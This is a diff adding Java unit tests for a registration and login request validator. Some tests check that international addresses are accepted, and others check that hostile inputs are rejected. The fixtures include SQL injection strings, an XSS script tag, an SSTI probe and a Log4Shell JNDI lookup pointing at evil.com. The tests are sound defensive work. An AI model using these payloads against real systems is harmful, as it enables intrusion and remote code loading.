@@ -63,6 +63,72 @@ class ClienteRegistroRequestValidationTest {
                 .anyMatch(error -> error.getPropertyPath().toString().equals("password")));
     }
 
+    @Test
+    void requestValido_aceptaDomicilioInternacionalConCodigoPostalAlfanumerico() {
+        ClienteRegistroRequest canada = requestValido();
+        canada.getDireccion().setPais("Canadá");
+        canada.getDireccion().setEstado("Ontario");
+        canada.getDireccion().setMunicipio("Toronto");
+        canada.getDireccion().setColonia("Downtown");
+        canada.getDireccion().setCodigoPostal("M5V 3L9");
+        assertTrue(validator.validate(canada).isEmpty());
+
+        ClienteRegistroRequest colombia = requestValido();
+        colombia.getDireccion().setPais("Colombia");
+        colombia.getDireccion().setEstado("Archipelago of Saint Andréws, Providence and Saint Catalina");
+        colombia.getDireccion().setMunicipio("Medellín");
+        colombia.getDireccion().setColonia("El Poblado");
+        colombia.getDireccion().setCodigoPostal("050021");
+        assertTrue(validator.validate(colombia).isEmpty());
+    }
+
+    @Test
+    void requestInvalido_rechazaCodigoPostalCortoOMaliciosoEnMexicoYExtranjero() {
+        ClienteRegistroRequest mexicoCorto = requestValido();
+        mexicoCorto.getDireccion().setPais("México");
+        mexicoCorto.getDireccion().setCodigoPostal("1234");
+        assertFalse(validator.validate(mexicoCorto).isEmpty());
+
+        ClienteRegistroRequest extranjeroMalicioso = requestValido();
+        extranjeroMalicioso.getDireccion().setPais("Canadá");
+        extranjeroMalicioso.getDireccion().setCodigoPostal("M5V';DROP");
+        assertFalse(validator.validate(extranjeroMalicioso).isEmpty());
+    }
+
+    @ParameterizedTest
+    @ValueSource(strings = {
+            "Reforma' OR '1'='1",
+            "Reforma; DROP TABLE usuarios; --",
+            "<script>alert('xss')</script>",
+            "${jndi:ldap://evil.com/a}",
+            "Calle {{7*7}}"
+    })
+    void requestInvalido_rechazaInyeccionSqlXssOSstiEnDomicilioYDatosLaborales(String payloadMalicioso) {
+        ClienteRegistroRequest request = requestValido();
+        request.getDireccion().setCalle(payloadMalicioso);
+        request.getInformacionLaboral().setEmpresa(payloadMalicioso);
+
+        var errores = validator.validate(request);
+        assertFalse(errores.isEmpty());
+        assertTrue(errores.stream().anyMatch(e -> e.getPropertyPath().toString().equals("direccion.calle")));
+        assertTrue(errores.stream().anyMatch(e -> e.getPropertyPath().toString().equals("informacionLaboral.empresa")));
+    }
+
+    @ParameterizedTest
+    @ValueSource(strings = {
+            "\"admin'--\"@example.com",
+            "usuario<script>@example.com",
+            "admin@example.com;DROP"
+    })
+    void loginYRegistro_rechazanCorreosConCaracteresDeInyeccion(String correoMalicioso) {
+        ClienteRegistroRequest registro = requestValido();
+        registro.setCorreo(correoMalicioso);
+        assertFalse(validator.validate(registro).isEmpty());
+
+        LoginRequest login = new LoginRequest(correoMalicioso, "Secreta1!", "WEB");
+        assertFalse(validator.validate(login).isEmpty());
+    }
+
     private ClienteRegistroRequest requestValido() {
         ClienteRegistroRequest request = new ClienteRegistroRequest();
         request.setNombre("Ana María");
